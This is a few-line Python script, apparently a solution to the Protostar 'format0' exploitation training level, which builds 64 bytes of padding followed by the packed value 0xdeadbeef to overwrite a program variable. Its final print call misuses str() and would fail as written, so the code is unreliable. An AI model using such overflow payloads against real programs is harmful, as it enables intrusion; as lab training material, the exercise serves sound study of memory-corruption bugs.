# Format0 Protostar

import struct

padding = "\x41" * 64
payload = struct.pack("I", 0xdeadbeef)

print(str(padding, payload))